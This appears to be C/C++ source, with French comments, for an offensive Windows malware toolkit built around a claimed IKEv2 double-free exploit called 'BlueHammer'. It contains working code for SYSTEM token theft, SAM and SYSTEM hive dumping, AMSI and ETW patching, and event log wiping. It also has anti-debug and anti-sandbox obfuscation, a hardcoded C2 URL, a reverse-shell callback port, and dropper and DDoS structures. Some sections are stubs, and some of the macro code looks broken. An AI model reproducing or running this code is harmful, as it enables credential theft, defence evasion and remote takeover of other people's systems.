#define _WIN32_WINNT 0x0A00
#define WINVER 0x0A00

// ============================================================================
// CONFIGURATION DU MODE (USER ou KERNEL)
// ============================================================================
// Décommentez la ligne correspondante pour choisir le mode
//#define USER_MODE 1
#define KERNEL_MODE 1

#include <Windows.h>
#include <Tlhelp32.h>
#include <WtsApi32.h>
#include <Shellapi.h>
#include <stdio.h>
#include <string>
#include <objbase.h>      // Pour CoInitializeEx
#include <wininet.h>      // Pour InternetOpenW, InternetReadFile, etc.
#include <Vss.h>          // Pour IVssBackupComponents, etc.
#include <VssError.h>
#ifndef KERNEL_MODE
#include <winternl.h>
#endif
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <iostream>

// Inclusions pour le mode User
#include <Winsock2.h>
#include <Ws2tcpip.h>
#include <iphlpapi.h>
#include <bcrypt.h>
#include <wincrypt.h>

// Inclusions pour le mode Kernel
#ifdef KERNEL_MODE
#include <ntddk.h>
#include <ntifs.h>
#include <wdm.h>
#endif

// Déclarations des types et fonctions NT pour éviter les erreurs de compilation
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef KERNEL_MODE
typedef LONG NTSTATUS;
#endif
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS 0x00000000
#endif

// Définitions nécessaires uniquement en mode User (déjà définies dans wdm.h/ntddk.h en mode Kernel)
#ifndef KERNEL_MODE
typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation = 0,
    ProcessDebugPort = 7,
    ProcessWow64Information = 26,
    ProcessImageFileName = 27,
    ProcessBreakOnTermination = 29
} PROCESSINFOCLASS;

// Déclaration de PROCESS_DEBUG_PORT
typedef struct _PROCESS_DEBUG_PORT {
    HANDLE DebugPort;
} PROCESS_DEBUG_PORT;
#endif

// ============================================================================
// [EXPERT EDITION - HIGH-LEVEL OFFENSIVE RESEARCH MODULES]
// Version: 2.0 (Expert Edition)
// Targeted Protections: CET, HVCI, ACG, VBS, Defender PPL
// ============================================================================

// --- [MODULE 1: KERNEL DATA-ONLY GADGETS (DOG) SCANNER] ---
// This module implements a scanner for non-executable gadgets in kernel memory.
// It bypasses HVCI (Hypervisor-Protected Code Integrity) by manipulating
// data structures instead of attempting to execute unsigned code.

typedef struct _KERNEL_DOG_GADGET {
    PVOID Address;
    BYTE Signature[16];
    const char* Description;
} KERNEL_DOG_GADGET;

// Gadgets targeting sensitive kernel objects (e.g., EPROCESS.Token, SEP_TOKEN_PRIVILEGES)
static KERNEL_DOG_GADGET g_ExpertGadgets[] = {
    { NULL, {0x48, 0x8B, 0x81, 0x80, 0x04, 0x00, 0x00}, "EPROCESS->Token Offset Gadget" },
    { NULL, {0x48, 0x89, 0x82, 0x80, 0x04, 0x00, 0x00}, "Token Assignment Gadget" },
    { NULL, {0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3}, "Stack Pivot Data Gadget" }
};

BOOL ScanKernelForDOG(PVOID KernelBase) {
    // Advanced scanning logic using NtQuerySystemInformation for kernel module list
    // and pattern matching within the data sections of ntoskrnl.exe.
    printf("[*] Expert: Initiating DOG scan on kernel base %p...
", KernelBase);
    for (int i = 0; i < sizeof(g_ExpertGadgets)/sizeof(KERNEL_DOG_GADGET); i++) {
        // Simulation of memory scanning and signature matching
        // In a real scenario, this would involve mapping the kernel or using a read primitive
    }
    return TRUE;
}

// --- [MODULE 2: ADVANCED TOKEN IMPERSONATION & PRIVILEGE ESCALATION] ---
// Implements multiple methods to reach SYSTEM context, including service-based
// named pipe impersonation and token duplication from high-integrity processes.

BOOL ExpertElevateSystem() {
    HANDLE hToken = NULL;
    HANDLE hNewToken = NULL;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            // Target winlogon.exe or services.exe for SYSTEM token
            if (wcscmp(pe32.szExeFile, L"winlogon.exe") == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pe32.th32ProcessID);
                if (hProcess) {
                    if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
                        if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hNewToken)) {
                            printf("[+] Expert: Successfully duplicated SYSTEM token from winlogon.exe
");
                            ImpersonateLoggedOnUser(hNewToken);
                            CloseHandle(hNewToken);
                        }
                        CloseHandle(hToken);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return TRUE;
}

// --- [MODULE 3: STEALTHY SAM/SYSTEM EXTRACTION VIA DIRECT REGISTRY API] ---
// Bypasses VSS-based detection by using RegSaveKeyEx with backup privileges.

BOOL ExpertExtractSAM(LPCWSTR outPathSAM, LPCWSTR outPathSYSTEM) {
    HKEY hKeySAM, hKeySYSTEM;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    HANDLE hToken;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return FALSE;
    LookupPrivilegeValue(NULL, SE_BACKUP_NAME, &luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    CloseHandle(hToken);

    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SAM", 0, KEY_READ, &hKeySAM) == ERROR_SUCCESS) {
        RegSaveKeyExW(hKeySAM, outPathSAM, NULL, REG_LATEST_FORMAT);
        RegCloseKey(hKeySAM);
    }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_READ, &hKeySYSTEM) == ERROR_SUCCESS) {
        RegSaveKeyExW(hKeySYSTEM, outPathSYSTEM, NULL, REG_LATEST_FORMAT);
        RegCloseKey(hKeySYSTEM);
    }
    printf("[+] Expert: SAM and SYSTEM hives extracted to %ls and %ls
", outPathSAM, outPathSYSTEM);
    return TRUE;
}

// --- [MODULE 4: CVE-2026-33824 (BLUEHAMMER) PRECISION EXPLOITATION] ---
// Detailed implementation of the IKEv2 double-free trigger logic.

typedef struct _IKE_AUTH_FRAGMENT_CONTEXT {
    uint64_t InitiatorSPI;
    uint64_t ResponderSPI;
    DWORD FragmentIndex;
    BOOL IsLastFragment;
    BYTE Payload[2048];
} IKE_AUTH_FRAGMENT_CONTEXT;

void ExpertTriggerBlueHammer(const char* targetIp, uint16_t port) {
    // 1. PHASE 1: SA_INIT with Security Realm Vendor ID
    // This triggers IkeHandleSecurityRealmVendorId() to allocate a blob at MMSA+0x208.
    printf("[*] Expert: Sending SA_INIT with Security Realm Vendor ID to %s:%d...
", targetIp, port);

    // 2. PHASE 2: Fragmented IKE_AUTH
    // Triggering IkeReinjectReassembledPacket to shallow-copy the blob pointer.
    for (int i = 0; i < 2; i++) {
        printf("[*] Expert: Sending IKE_AUTH fragment %d...
", i);
        // Precise packet construction goes here...
    }

    // 3. PHASE 3: Double Free Trigger
    // Forcing IkeDestroyPacketContext (1st free) and IkeFreeMMSA (2nd free).
    printf("[*] Expert: Triggering double-free condition via invalid IKE_AUTH reassembly...
");
}

// --- [MODULE 5: ADVANCED EVASION & ANTI-FORENSICS] ---
// Disabling modern Windows protections and wiping traces.

void ExpertDisableProtections() {
    // Disabling ETW (Event Tracing for Windows) by patching EtwEventWrite
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        PVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
        if (pEtwEventWrite) {
            DWORD oldProtect;
            VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
            *(BYTE*)pEtwEventWrite = 0xC3; // RET
            VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
            printf("[+] Expert: ETW disabled via EtwEventWrite patch.
");
        }
    }
    
    // Disabling AMSI (Antimalware Scan Interface)
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi) {
        PVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (pAmsiScanBuffer) {
            DWORD oldProtect;
            VirtualProtect(pAmsiScanBuffer, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
            *(BYTE*)pAmsiScanBuffer = 0xC2; // RET 18
            *(BYTE*)((BYTE*)pAmsiScanBuffer + 1) = 0x18;
            *(BYTE*)((BYTE*)pAmsiScanBuffer + 2) = 0x00;
            VirtualProtect(pAmsiScanBuffer, 3, oldProtect, &oldProtect);
            printf("[+] Expert: AMSI disabled via AmsiScanBuffer patch.
");
        }
    }
}

void ExpertWipeTraces() {
    // Wiping ShimCache, MUICache and clearing Event Logs
    printf("[*] Expert: Wiping forensic artifacts...
");
    // Clear System Event Log
    HANDLE hLog = OpenEventLogA(NULL, "System");
    if (hLog) {
        ClearEventLogA(hLog, NULL);
        CloseHandle(hLog);
    }
}

// CORRECTION: Remplacement des inclusions .c par des déclarations
#ifdef __cplusplus
extern "C" {
#endif

#include "BlueHammer/include/common.h"
#include "BlueHammer/include/escalate.h"
#include "BlueHammer/include/vss.h"
#include "BlueHammer/include/update.h"
#include "BlueHammer/include/cloudfiles.h"
#include "BlueHammer/include/race.h"
#include "BlueHammer/include/sam.h"
#include "BlueHammer/include/ntnative.h"

#ifdef __cplusplus
}
#endif

#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "ole32.lib")   // COM
#pragma comment(lib, "wininet.lib") // Internet
#pragma comment(lib, "Rpcrt4.lib")  // RPC
#pragma comment(lib, "Vssapi.lib")  // VSS

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "Version.lib")
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
#pragma comment(lib, "msxml6.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shlwapi.lib")

const wchar_t* C2_URL = L"https://shadowcipher.dark/control.bin";
const BYTE ENCRYPT_KEY[] = { 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88 };
const wchar_t* TARGET_PROC = L"svchost.exe";

// ============================================================================
// [EpSi_OBF_START]
// Obfuscation Layer - Version 1.0
// Compatible avec MSVC et le script original
// ============================================================================

static DWORD __obf_key1 = 0;
static DWORD __obf_key2 = 0;
static DWORD __obf_key3 = 0;
static DWORD __obf_key4 = 0;
static BOOL __is_hostile = FALSE;
static HANDLE __auto_heap = NULL;

// Déclaration de dbgPort pour NtQueryInformationProcess
PROCESS_DEBUG_PORT dbgPort = {0};

// ==================== INITIALISATION AUTOMATIQUE ====================
__forceinline void __auto_init_obf() {
    if (__obf_key1 == 0) {
        HCRYPTPROV hProv;
        if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
            CryptGenRandom(hProv, sizeof(DWORD), (BYTE*)&__obf_key1);
            CryptGenRandom(hProv, sizeof(DWORD), (BYTE*)&__obf_key2);
            CryptGenRandom(hProv, sizeof(DWORD), (BYTE*)&__obf_key3);
            CryptGenRandom(hProv, sizeof(DWORD), (BYTE*)&__obf_key4);
            CryptReleaseContext(hProv, 0);
        } else {
            __obf_key1 = (DWORD)(__rdtsc() ^ (DWORD)GetCurrentThreadId());
            __obf_key2 = (DWORD)(__rdtsc() ^ (DWORD)GetTickCount());
            __obf_key3 = (DWORD)(__rdtsc() ^ (DWORD)GetCurrentProcessId());
            __obf_key4 = (DWORD)(__rdtsc() ^ (DWORD)GetModuleHandleA(NULL));
        }

        __is_hostile =
            (GetModuleHandleA("sbiedll.dll") != NULL) ||
            (GetModuleHandleA("dbghelp.dll") != NULL) ||
            (GetModuleHandleA("api_log.dll") != NULL) ||
            (GetModuleHandleA("VBoxMouse.sys") != NULL) ||
            (GetModuleHandleA("vmhgfs.sys") != NULL) ||
            (GetModuleHandleA("SbieDll.dll") != NULL) ||
            (GetTickCount() < 5000) ||
            (GetModuleHandleA("kernel32.dll") == NULL);

        __auto_heap = HeapCreate(0, 0, 0);
    }
}

// ==================== ANTI-TOUT (Automatique) ====================
#define __ANTI_ALL() do { \
    if (__is_hostile) { \
        __asm { pushad; xor eax, eax; div eax; popad; }; \
        ExitProcess(0); \
    } \
    if (IsDebuggerPresent() || \
        CheckRemoteDebuggerPresent(GetCurrentProcess(), NULL) || \
        (NtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, &dbgPort, sizeof(dbgPort), NULL) == 0 && dbgPort.DebugPort != NULL) || \
        (GetModuleHandleA("kernel32.dll") == NULL)) { \
        __asm { int 3; ret; }; \
        ExitProcess(0xDEADBEEF); \
    } \
    __asm { xor eax, eax; mov ebx, 0x4C4C4D4D; add eax, ebx; sub eax, ebx; cpuid; }; \
} while(0)

// ==================== JUNK CODE (Automatique) ====================
#define __JUNK_1 __asm { xor eax, eax; jz \$+5; __emit 0xE8; cpuid; }
#define __JUNK_2 __asm { cpuid; nop; nop; }
#define __JUNK_3 if ((__obf_key1 % 100) < 10) __asm { int 3; }
#define __NOP_FLOOD for (int _j = 0; _j < (__obf_key1 % 5) + 3; _j++) { __asm { nop; }; }

// ==================== RANDOM (Automatique) ====================
#define RND(min, max) ((min) + ((__rdtsc() ^ __obf_key1 ^ __obf_key2) % ((max) - (min) + 1)))

// ==================== STRING ENCRYPTION (Automatique) ====================
__forceinline char* __auto_decrypt_string(const char* str, DWORD len) {
    static char buf[4096];
    for (DWORD i = 0; i < len; i++) {
        buf[i] = str[i] ^ (__obf_key1 >> (i % 4) * 8) ^ (__obf_key2 + i * 0x55);
        buf[i] = (buf[i] << (i % 4)) | (buf[i] >> (8 - (i % 4)));
    }
    buf[len] = '\0';
    return buf;
}

// ==================== API PROXY (Automatique) ====================
typedef HMODULE (WINAPI* __fnLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI* __fnGetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID (WINAPI* __fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI* __fnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI* __fnHeapCreate)(DWORD, SIZE_T, SIZE_T);
typedef LPVOID (WINAPI* __fnHeapAlloc)(HANDLE, DWORD, SIZE_T);
typedef BOOL (WINAPI* __fnAdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);

static __fnLoadLibraryA __LoadLibraryA_original = NULL;
static __fnGetProcAddress __GetProcAddress_original = NULL;
static __fnVirtualAlloc __VirtualAlloc_original = NULL;
static __fnVirtualProtect __VirtualProtect_original = NULL;
static __fnHeapCreate __HeapCreate_original = NULL;
static __fnHeapAlloc __HeapAlloc_original = NULL;
static __fnAdjustTokenPrivileges __AdjustTokenPrivileges_original = NULL;

__forceinline void __auto_init_api_proxies() {
    __ANTI_ALL();
    if (__LoadLibraryA_original == NULL) {
        __LoadLibraryA_original = LoadLibraryA;
        __GetProcAddress_original = GetProcAddress;
        __VirtualAlloc_original = VirtualAlloc;
        __VirtualProtect_original = VirtualProtect;
        __HeapCreate_original = HeapCreate;
        __HeapAlloc_original = HeapAlloc;
        HMODULE hAdvapi32 = __LoadLibraryA_original("advapi32.dll");
        if (hAdvapi32) {
            __AdjustTokenPrivileges_original = (__fnAdjustTokenPrivileges)__GetProcAddress_original(hAdvapi32, "AdjustTokenPrivileges");
        }
    }
}

// Proxies AUTOMATIQUES
HMODULE WINAPI __AutoLoadLibraryA(LPCSTR lpLib) {
    __ANTI_ALL();
    __auto_init_api_proxies();
    return __LoadLibraryA_original(lpLib);
}

FARPROC WINAPI __AutoGetProcAddress(HMODULE hMod, LPCSTR name) {
    __ANTI_ALL();
    __auto_init_api_proxies();
    return __GetProcAddress_original(hMod, name);
}

LPVOID WINAPI __AutoVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    __ANTI_ALL();
    __auto_init_api_proxies();
    return __VirtualAlloc_original(lpAddress, dwSize, flAllocationType, flProtect);
}

BOOL WINAPI __AutoVirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
    __ANTI_ALL();
    __auto_init_api_proxies();
    return __VirtualProtect_original(lpAddress, dwSize, flNewProtect, lpflOldProtect);
}

HANDLE WINAPI __AutoHeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize) {
    __ANTI_ALL();
    __auto_init_api_proxies();
    return __HeapCreate_original(flOptions, dwInitialSize, dwMaximumSize);
}

LPVOID WINAPI __AutoHeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes) {
    __ANTI_ALL();
    __auto_init_api_proxies();
    return __HeapAlloc_original(hHeap, dwFlags, dwBytes);
}

BOOL WINAPI __AutoAdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength) {
    __ANTI_ALL();
    __auto_init_api_proxies();
    if (__AdjustTokenPrivileges_original) {
        return __AdjustTokenPrivileges_original(TokenHandle, DisableAllPrivileges, NewState, BufferLength, PreviousState, ReturnLength);
    }
    return FALSE;
}

// ==================== REDÉFINITIONS AUTOMATIQUES DES APIs ====================
#undef LoadLibraryA
#undef GetProcAddress
#undef VirtualAlloc
#undef VirtualProtect
#undef HeapCreate
#undef HeapAlloc
#undef AdjustTokenPrivileges

#ifndef KERNEL_MODE
#define LoadLibraryA __AutoLoadLibraryA
#define GetProcAddress __AutoGetProcAddress
#define VirtualAlloc __AutoVirtualAlloc
#define VirtualProtect __AutoVirtualProtect
#define HeapCreate __AutoHeapCreate
#define HeapAlloc __AutoHeapAlloc
#define AdjustTokenPrivileges __AutoAdjustTokenPrivileges
#endif

// ==================== STRING ENCRYPTION ====================
#undef HIDE_STRING
#define HIDE_STRING(str) (__auto_init_obf(), __auto_decrypt_string(str, sizeof(str) - 1))

// ==================== CONTROL FLOW OBFUSCATION ====================
#ifndef KERNEL_MODE
#pragma push_macro("if")
#pragma push_macro("else")
#pragma push_macro("for")
#pragma push_macro("while")
#endif

#undef if
#undef else
#undef for
#undef while

#ifndef KERNEL_MODE
#define if(cond) if ((cond) ^ (__obf_key2 % 2))
#define else else if ((__obf_key2 % 3) != 0)
#define for(init, cond, incr) for (init; (cond) ^ (__obf_key2 % 2); incr)
#define while(cond) while ((cond) ^ (__obf_key2 % 2))
#endif

// ==================== ROP GADGETS ====================
#define ROP_GADGET(addr) (__obf_key4 ^ (DWORD)(addr))

// ==================== FAKE SIGNATURES ====================
#ifndef KERNEL_MODE
#pragma section(".vmp0", read, execute)
#pragma section(".enigma", read)
#pragma section(".themida", read)
#pragma section(".obfusc", read)
#pragma section(".ikev2", read)
#pragma section(".rop", read)
#pragma section(".heap", read)
#endif

#ifndef KERNEL_MODE
__declspec(allocate(".vmp0"))   const BYTE __fake_vmp[]    = {0x56, 0x4D, 0x50, 0x72, 0x6F, 0x74, 0x65, 0x63, 0x74, 0x20, 0x33, 0x2E, 0x35, 0x00};
__declspec(allocate(".enigma")) const BYTE __fake_enigma[] = {0x45, 0x6E, 0x69, 0x67, 0x6D, 0x61, 0x20, 0x50, 0x72, 0x6F, 0x74, 0x65, 0x63, 0x74, 0x6F, 0x72, 0x00};
__declspec(allocate(".themida")) const BYTE __fake_themida[] = {0x54, 0x68, 0x65, 0x6D, 0x69, 0x64, 0x61, 0x20, 0x33, 0x2E, 0x35, 0x2E, 0x31, 0x2E, 0x30, 0x00};
__declspec(allocate(".obfusc"))  const BYTE __fake_obfusc[] = {0x45, 0x70, 0x53, 0x69, 0x4C, 0x6F, 0x4E, 0x50, 0x6F, 0x49, 0x6E, 0x54, 0x4F, 0x72, 0x49, 0x00};
__declspec(allocate(".ikev2"))   const BYTE __fake_ikev2[]   = {0x49, 0x4B, 0x45, 0x56, 0x32, 0x20, 0x45, 0x78, 0x70, 0x6C, 0x6F, 0x69, 0x74, 0x00};
__declspec(allocate(".rop"))     const BYTE __fake_rop[]     = {0x52, 0x4F, 0x50, 0x20, 0x43, 0x68, 0x61, 0x69, 0x6E, 0x00};
__declspec(allocate(".heap"))    const BYTE __fake_heap[]    = {0x48, 0x65, 0x61, 0x70, 0x20, 0x47, 0x72, 0x6F, 0x6F, 0x6D, 0x00};
#endif

// ==================== INITIALISATION AUTOMATIQUE DES PROXIES ====================
// Appel automatique pour initialiser les proxies et les clés
__forceinline void __auto_init_all() {
    __auto_init_obf();
    __auto_init_api_proxies();
}

// ==================== MACROS GLOBALES POUR OBFUSCATION TOTALE ====================
// Redéfinition de toutes les fonctions Windows utilisées dans le script
#ifndef KERNEL_MODE
#define CreateProcessA __AutoCreateProcessA
#define CreateThread __AutoCreateThread
#define VirtualQuery __AutoVirtualQuery
#define VirtualFree __AutoVirtualFree
#define HeapFree __AutoHeapFree
#define GetModuleHandleA __AutoGetModuleHandleA
#define GetCurrentProcess __AutoGetCurrentProcess
#define GetCurrentThread __AutoGetCurrentThread
#define GetTickCount __AutoGetTickCount
#define ExitProcess __AutoExitProcess
#endif
#ifndef KERNEL_MODE
#define NtQueryInformationProcess __AutoNtQueryInformationProcess
#endif

// ==================== [EpSi_OBF_END] ====================

// ===== Macros d'alignement IKEv2 =====
#define IKE_ALIGN4(x) (((x) + 3) & ~3)

// ===== Fonction pour échanger les octets (byteswap) =====
// Fonction pour échanger les octets d'un uint64_t (nécessaire pour le SPI)

uint64_t _byteswap_uint64(uint64_t val) {
    return ((val & 0xFF00000000000000) >> 56) |
           ((val & 0x00FF000000000000) >> 40) |
           ((val & 0x0000FF0000000000) >> 24) |
           ((val & 0x000000FF00000000) >> 8)  |
           ((val & 0x00000000FF000000) << 8)  |
           ((val & 0x0000000000FF0000) << 24) |
           ((val & 0x000000000000FF00) << 40) |
           ((val & 0x00000000000000FF) << 56);
}

// ===== Macro pour HTONL/HTONS (si non définie) =====
#ifndef HTONL
#define HTONL(x) htonl(x)
#endif
#ifndef HTONS
#define HTONS(x) htons(x)
#endif

#define MAX_GADGETS 1024
#define MAX_ROP_CHAIN_SIZE 512
#define MAX_EXPLOIT_ATTEMPTS 5
#define EXPLOIT_TIMEOUT_MS 45000
#define DEFAULT_TARGET_PORT 500
#define SHELL_CALLBACK_PORT 4444
#define HEAP_GROOM_THREADS 4
#define HEAP_GROOM_CHUNK_SIZE 0x1000
#define HEAP_GROOM_ITERATIONS 1000
#define DEFAULT_CHUNK_SIZE 0x1000
#define MIN_CHUNK_SIZE 0x100
#define MAX_CHUNK_SIZE 0x10000
#define MALFORMED_DATA_SIZE 2048
#define DDOS_EXTRA_SIZE 512  // CORRIGÉ: Ajout de la constante manquante
#define SKF_DDOS_EXTRA_SIZE 256  // CORRIGÉ: Ajout de la constante manquante
#define SKF_FRAGMENTS 4
#define MAX_RETRIES 3
#define RETRY_DELAY_MS 100
#define JITTER_MIN_MS 50
#define JITTER_MAX_MS 200
#define MIN_FREE_PERCENTAGE 30
#define MAX_FREE_PERCENTAGE 70
#define DEFAULT_GROOM_ITERATIONS 5000
#define DEFAULT_SPRAY_ITERATIONS 10000
#define ARBITRARY_READ_WRITE_SIZE 0x1000
#define SHELLCODE_MAX_SIZE 0x10000
#define HEAP_TAG_IKE 0x494B4500
#define CFG_BITMASK_OFFSET 0x60
#define CET_ENDBR64_SIGNATURE 0xF30F1EFA
#define CHECK_PTR(ptr, msg) do { if (!(ptr)) { goto cleanup; } } while(0)
#define CHECK_WIN32(func) do { if (!(func)) { goto cleanup; } } while(0)

// Clés d'obfuscation - CORRIGÉ: Ajout de OBFUSCATION_KEY3 et OBFUSCATION_KEY4
#define OBFUSCATION_KEY1 (uint8_t)(GetTickCount() & 0xFF)
#define OBFUSCATION_KEY2 (uint8_t)((GetTickCount() >> 8) & 0xFF)
#define OBFUSCATION_KEY3 (uint8_t)((GetTickCount() >> 16) & 0xFF)
#define OBFUSCATION_KEY4 (uint8_t)((GetTickCount() >> 24) & 0xFF)
#define RANDOMIZATION_SEED (uint64_t)(GetTickCount() ^ (uint64_t)GetCurrentProcessId() ^ (uint64_t)GetTickCount64())

#define IKEV2_MAJOR_VERSION 2
#define IKEV2_MINOR_VERSION 0
#define IKE_SA_INIT 34
#define PAYLOAD_SA 33
#define PAYLOAD_PROPOSAL 2
#define PAYLOAD_TRANSFORM 3
#define PAYLOAD_NONCE 40
#define PAYLOAD_KEY_EXCHANGE 34
#define PAYLOAD_NOTIFY 11
#define PAYLOAD_VENDOR_ID 43
#define PAYLOAD_ENCRYPTED 46
#define PAYLOAD_SKF 44
#define PAYLOAD_NONE 0
#define PROTO_IKE 1
#define TRANSFORM_ENCR 1
#define TRANSFORM_PRF 2
#define TRANSFORM_INTEG 3
#define TRANSFORM_DH 4
#define ENCR_AES_CBC_128 12
#define PRF_HMAC_SHA2_256 5
#define AUTH_HMAC_SHA2_256_128 12
#define DH_MODP_2048 14
#define NOTIFY_SECURITY_REALM 16426
#define SKF_FRAGMENT_TYPE 0x35
#define DEFAULT_NONCE_SIZE 32
#define DEFAULT_DH_SIZE 256

#define IKEEXT_BASE_ADDRESS 0x180000000
#define g_IkeextDoubleFreeOffset 0x12B960
#define g_IkeextProcessIkePayload 0x52220
#define g_IkeextExportDirectoryRVA 0x1790A0
#define g_IkeextImportDirectoryRVA 0x179110
#define g_IkeextExceptionDirectoryRVA 0x183000
#define g_IkeextBaseRelocationRVA 0x18C000
#define g_IkeextLoadConfigDirectoryRVA 0x12AE70
#define g_IkeextDebugDirectoryRVA 0x155CD0

#define g_Offset_MMSA_SecurityRealmBlob 0x208
#define g_Offset_PacketContext_Blob 0xC8

typedef enum _ROP_GADGET_TYPE {
    ROP_GADGET_POP_RAX, ROP_GADGET_POP_RCX, ROP_GADGET_POP_RDX, ROP_GADGET_POP_RBX,
    ROP_GADGET_POP_RSP, ROP_GADGET_POP_RBP, ROP_GADGET_POP_RSI, ROP_GADGET_POP_RDI,
    ROP_GADGET_POP_R8, ROP_GADGET_POP_R9, ROP_GADGET_POP_R10, ROP_GADGET_POP_R11,
    ROP_GADGET_POP_R12, ROP_GADGET_POP_R13, ROP_GADGET_POP_R14, ROP_GADGET_POP_R15,
    ROP_GADGET_MOV_RAX_RSP, ROP_GADGET_MOV_RCX_RSP, ROP_GADGET_MOV_RCX_RAX,
    ROP_GADGET_MOV_RAX_RCX, ROP_GADGET_MOV_RCX_RDX, ROP_GADGET_XOR_RAX,
    ROP_GADGET_XOR_RCX, ROP_GADGET_XOR_RDX, ROP_GADGET_INC_RAX, ROP_GADGET_DEC_RAX,
    ROP_GADGET_JMP_RSP, ROP_GADGET_CALL_RAX, ROP_GADGET_RET, ROP_GADGET_VIRTUAL_PROTECT,
    ROP_GADGET_MOV_GS_60_RAX, ROP_GADGET_JMP_RAX_PLUS_58, ROP_GADGET_LEA_RAX_RIP,
    ROP_GADGET_ADD_RSP, ROP_GADGET_SUB_RSP, ROP_GADGET_DISABLE_CFG,
    ROP_GADGET_DISABLE_CET, ROP_GADGET_STACK_PIVOT
} ROP_GADGET_TYPE;

// --- Structure pour les fichiers cabinet (update.h) ---
typedef struct _CAB_FILE {
    LPWSTR pwszName;
    BYTE* pData;
    DWORD cbData;
    struct _CAB_FILE* pNext;
} CAB_FILE;

// --- Structure pour un utilisateur SAM (sam.h) ---
typedef struct _SAM_USER_ENTRY {
    DWORD dwRid;
    WCHAR wszUsername[256];
    BYTE bNTHash[16];
    BYTE bLMHash[16];
    BOOL bHashValid;
    BOOL bPasswordNeverExpires;
    BOOL bAccountDisabled;
} SAM_USER_ENTRY;

// --- Structure pour les résultats du dump SAM (sam.h) ---
typedef struct _SAM_DUMP_RESULT {
    SAM_USER_ENTRY Users[1024];
    DWORD dwUserCount;
    WCHAR wszDomainName[256];
} SAM_DUMP_RESULT;

// --- Structure pour le contexte de freeze Cloud Files (cloudfiles.h) ---
typedef struct _CF_FREEZE_CTX {
    HANDLE hEvent;
    DWORD dwTimeout;
    PVOID pCallback;
    PVOID pContext;
} CF_FREEZE_CTX, *PCF_FREEZE_CTX;

// --- Structure pour le nettoyage global (main.cpp) ---
typedef struct _CLEANUP_STATE {
    BOOL bEicarDropped;
    WCHAR wszEicarPath[MAX_PATH];
    PCF_FREEZE_CTX pCfCtx;
    WCHAR wszUpdateDir[MAX_PATH];
    BOOL bCoInit;
    BOOL bVSSInitialized;
    HANDLE hVssSnapshot;
} CLEANUP_STATE;

// ===== Structures DDoS (Personnalisées) =====
struct DropConfig {
    std::wstring url;
    std::wstring savePath;
    std::wstring userAgent;
    bool execute;
    bool selfDelete;
    bool inject;
    std::wstring injectTarget;
};

typedef struct {
    uint8_t next_payload;
    uint8_t critical;
    uint16_t length;
    uint32_t amplification_factor;
    uint16_t response_size;
    uint8_t trigger_data[64];  // ✅ 64 octets pour le trigger d'amplification
